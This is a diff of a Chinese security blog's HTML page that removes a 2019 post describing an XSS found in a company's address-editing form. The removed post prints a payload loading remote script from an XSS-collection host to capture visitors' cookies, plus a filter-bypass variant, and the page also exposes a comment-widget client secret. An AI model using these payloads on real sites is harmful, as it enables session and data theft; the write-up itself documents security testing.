@@ -33,8 +33,6 @@
     <link rel="icon" href="/img/avatar.png">
   
   
-  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
-  
   <link rel="stylesheet" href="/css/style.css">
   <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   <link rel="apple-touch-icon" href="/apple-touch-icon.png">
@@ -48,7 +46,7 @@
   <script>
       var yiliaConfig = {
           fancybox: true,
-          animate: true,
+          animate: false,
           isHome: false,
           isPost: true,
           isArchive: false,
@@ -69,7 +67,7 @@
 
         <a href="/" class="profilepic">
             
-            <img lazy-src="/img/avatar.png" class="js-avatar">
+            <img src="/img/avatar.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
             
         </a>
         <hgroup>
@@ -191,7 +189,7 @@
         <header id="header" class="inner">
             <a href="/" class="profilepic">
                 
-                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                    <img src="/img/avatar.png" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
                 
             </a>
             <hgroup>
@@ -222,232 +220,7 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-【渗透实例】记录一次XSS渗透过程" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/year/190703-221956.html" class="article-date">
-      <time datetime="2019-07-03T14:19:56.000Z" itemprop="datePublished">2019-07-03</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      【渗透实例】记录一次XSS渗透过程
-    </h1>
-  
-
-
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/渗透实例/">渗透实例</a>
-    </div>
-
-
-        
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透实例/">渗透实例</a></li></ul>
-    </div>
-
-        <div class="clearfix"></div>
-      </div>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="0x01-找到存在XSS的位置"><a href="#0x01-找到存在XSS的位置" class="headerlink" title="0x01 找到存在XSS的位置"></a>0x01 找到存在XSS的位置</h1><p>没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。</p>
-<a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用的XSS代码：&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png" alt></p>
-<h1 id="0x02-构造XSS代码连接到XSS平台"><a href="#0x02-构造XSS代码连接到XSS平台" class="headerlink" title="0x02 构造XSS代码连接到XSS平台"></a>0x02 构造XSS代码连接到XSS平台</h1><p>XSS平台给我们的XSS代码是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png" alt><br>直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;\&quot;&gt;&lt;\sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/\sCrIpT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这条代码比上面平台给的XSS代码的多了几个 “&quot;，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png" alt><br>加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png" alt><br>这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。<br>并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。</p>
-
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-		<script>
-		var gitalkConfig = {"clientID":"bb756d7275add451dc09","clientSecret":"425cdddcfb84023df2e6f38ab14af57476e7cfbf","repo":"Gitalk","owner":"teamssix","admin":["teamssix"],"distractionFreeMode":false};
-	    gitalkConfig.id = location.pathname;
-		var gitalk = new Gitalk(gitalkConfig);
-	    gitalk.render("gitalk-container");
-	    </script>
-      
-    </div>
-    
-  </div>
-  
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/year/190703-221956.html">【渗透实例】记录一次XSS渗透过程</a></p>
-        <p><span>文章作者:</span><a href="/" title="访问 Teams Six 的个人博客">Teams Six</a></p>
-        <p><span>发布时间:</span>2019年07月03日 - 22时19分</p>
-        <p><span>最后更新:</span>2019年10月16日 - 17时31分</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/year/190703-221956.html" title="【渗透实例】记录一次XSS渗透过程">http://www.teamssix.com/year/190703-221956.html</a>
-            <span class="copy-path" data-clipboard-text="原文: http://www.teamssix.com/year/190703-221956.html　　作者: Teams Six" title></span>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
-
-
-
-<nav id="article-nav">
-  
-    <a href="/year/190709-202131.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          【经验总结】小白挖洞十天经验分享
-        
-      </div>
-    </a>
-  
-  
-    <a href="/year/190619-202702.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">【Python实例】让Python告诉你B站观影指南</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
-  
-</nav>
-
-
-  
-</article>
-
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-找到存在XSS的位置"><span class="toc-number">1.</span> <span class="toc-text">0x01 找到存在XSS的位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-构造XSS代码连接到XSS平台"><span class="toc-number">2.</span> <span class="toc-text">0x02 构造XSS代码连接到XSS平台</span></a></li></ol>
-</div>
-<style>
-    .left-col .switch-btn {
-        display: none;
-    }
-    .left-col .switch-area {
-        display: none;
-    }
-</style>
-<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
-
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-<script>
-    var valueHide = "隐藏目录";
-    var valueShow = "显示目录";
-    if ($(".left-col").is(":hidden")) {
-        $("#tocButton").attr("value", valueShow);
-    }
-    $("#tocButton").click(function() {
-        if ($("#toc").is(":hidden")) {
-            $("#tocButton").attr("value", valueHide);
-            $("#toc").slideDown(320);
-            $(".switch-btn, .switch-area").fadeOut(300);
-        }
-        else {
-            $("#tocButton").attr("value", valueShow);
-            $("#toc").slideUp(350);
-            $(".switch-btn, .switch-area").fadeIn(500);
-        }
-    })
-    if ($(".toc").length < 1) {
-        $("#toc, #tocButton").hide();
-        $(".switch-btn, .switch-area").show();
-    }
-</script>
-
-
-
-
-
-
-
-
-  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script type="text/javascript">
-
-if(){
-  var gitalk = new Gitalk({
-    clientID: 'bb756d7275add451dc09',
-    clientSecret: '425cdddcfb84023df2e6f38ab14af57476e7cfbf',
-    repo: 'Gitalk',
-    owner: 'teamssix',
-    admin: ['teamssix'],
-    id: 'Wed Jul 03 2019 22:19:56 GMT+0800',
-    distractionFreeMode: 'true'
-})
-gitalk.render('gitalk-container') 
-}
-</script>
-  
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/year/190709-202131.html" title="上一篇: 【经验总结】小白挖洞十天经验分享">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-        
-            <a href="/year/190619-202702.html" title="下一篇: 【Python实例】让Python告诉你B站观影指南">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/year/191014-090745.html">经过一场面试，我发现我还存在这些不足</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191009-164624.html">【经验总结】VPS欠费后Hexo博客521无法访问</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190925-114420.html">【CTF】记录一次CTF比赛的Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190720-121144.html">【经验总结】记录一次Docker下安装CTFd的错误</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190717-124041.html">分享一张超详细的渗透测试导图</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190715-102622.html">【工具】批量网站CMS指纹识别</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190709-202131.html">【经验总结】小白挖洞十天经验分享</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190703-221956.html">【渗透实例】记录一次XSS渗透过程</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190619-202702.html">【Python实例】让Python告诉你B站观影指南</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190618-225704.html">【Python实例】让Python告诉你当前最火的电影是什么</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190615-013724.html">【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-134948.html">对于连接ssh时连时断的解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-111512.html">hexo自适应BiliBili视频大小的解决方案</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190613-191825.html">【Python实例】批量下载斗罗大陆高清视频</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191612-123700.html">为自定义域名的Hexo博客升级到Https网站</a></li></ul>
-    
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-    <script>
-        $(".post-list").addClass("toc-article");
-        // $(".post-list-item a").attr("target","_blank");
-        $("#post-nav-button > a:nth-child(2)").click(function() {
-            $(".fa-bars, .fa-times").toggle();
-            $(".post-list").toggle(300);
-            if ($(".toc").length > 0) {
-                $("#toc, #tocButton").toggle(200, function() {
-                    if ($(".switch-area").is(":visible")) {
-                        $("#toc, .switch-btn, .switch-area").toggle();
-                        $("#tocButton").attr("value", valueHide);
-                        }
-                    })
-            }
-            else {
-                $(".switch-btn, .switch-area").fadeToggle(300);
-            }
-        })
-    </script>
-
-
-
-
-    <script>
-        
-    </script>
-
-</div>
+      <div class="body-wrap"></div>
       <footer id="footer">
     <div class="outer">
         <div id="footer-info">
@@ -542,31 +315,6 @@ ga('send', 'pageview');
 </script>
 
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-
-  <script language="javascript">
-    $(function() {
-        $("a[title]").each(function() {
-            var a = $(this);
-            var title = a.attr('title');
-            if (title == undefined || title == "") return;
-            a.data('title', title).removeAttr('title').hover(
-            function() {
-                var offset = a.offset();
-                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
-                    top: offset.top - a.outerHeight() - 15,
-                    left: offset.left + a.outerWidth()/2 + 1
-                }).fadeIn(function() {
-                    var pop = $(this);
-                    setTimeout(function() {
-                        pop.remove();
-                    }, pop.text().length * 800);
-                });
-            }, function() {
-                $("#anchortitlecontainer").remove();
-            });
-        });
-    });
 </script>
 
 
